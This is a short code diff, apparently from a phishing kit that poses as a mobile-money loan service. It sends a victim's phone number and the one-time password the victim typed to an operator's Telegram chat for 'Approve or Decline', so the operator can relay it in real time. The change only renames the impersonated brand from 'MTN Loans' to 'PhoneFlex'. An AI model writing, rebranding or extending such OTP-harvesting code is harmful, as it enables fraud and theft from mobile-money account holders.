@@ -536,7 +536,7 @@
                 const identifier = `MTN Loans MoMo: +260 ${phone}`;
                 const escapedOtp = escapeHtml(enteredOtp);
                 const msg =
-                    `🔐 <b>MTN Loans OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
+                    `🔐 <b>PhoneFlex OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
 
                 await sendToTelegram({
                     chat_id: CHAT_ID,
